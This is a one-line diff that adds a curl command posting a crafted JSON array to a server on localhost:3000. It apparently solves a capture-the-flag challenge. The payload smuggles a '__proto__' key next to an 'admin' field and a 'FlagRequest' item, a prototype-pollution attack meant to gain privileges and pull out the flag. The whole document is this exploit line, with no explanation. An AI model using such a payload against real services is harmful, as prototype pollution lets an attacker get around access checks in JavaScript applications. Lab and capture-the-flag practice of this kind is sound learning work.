@@ -1,0 +1,1 @@
+curl localhost:3000 -d '[{"admin": 1, "__proto__": 2}, true, ["FlagRequest",3], [4], "hello"]'
